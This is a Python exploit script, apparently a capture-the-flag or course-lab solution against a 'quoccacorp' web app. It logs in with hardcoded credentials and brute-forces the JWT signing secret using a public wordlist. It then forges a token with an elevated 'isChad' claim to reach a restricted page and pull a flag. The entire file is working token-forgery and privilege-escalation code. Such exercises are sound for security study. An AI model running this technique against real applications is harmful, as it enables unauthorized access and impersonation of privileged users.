import requests
import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))

from utils import get_session, find_flag
import jwt

BASE_URL = "https://soycentral.quoccacorp.com"
USERNAME = "grayons"
PASSWORD = "ilovesoy22"
ALGORITHM = "HS256"
SECRETS_LIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list"

session = get_session()

def get_secrets_list(session: requests.Session, secrets_list_url=SECRETS_LIST_URL) -> list[str]:
    return session.get(secrets_list_url).text.splitlines()

def brute_force_jwt_secret_key(jwt_token: str, algorithm=ALGORITHM):
    for secret in get_secrets_list(session):
        try:
            jwt.decode(jwt_token, secret, algorithms=[algorithm])
            return secret
        except jwt.InvalidSignatureError:
            continue

def main():
    session.post(
        BASE_URL + "/login",
        data={"user": USERNAME, "password": PASSWORD}
    )

    original_jwt = session.cookies.get("session")

    jwt_payload_data: dict = jwt.decode(original_jwt, options={"verify_signature": False})
    jwt_payload_data["isChad"] = True

    new_jwt = jwt.encode(jwt_payload_data, brute_force_jwt_secret_key(original_jwt), algorithm=ALGORITHM)

    session.cookies.clear()
    session.cookies.set("session", new_jwt)

    response = session.get(BASE_URL + "/chads")
    find_flag(response.text)

if __name__ == "__main__":
    main()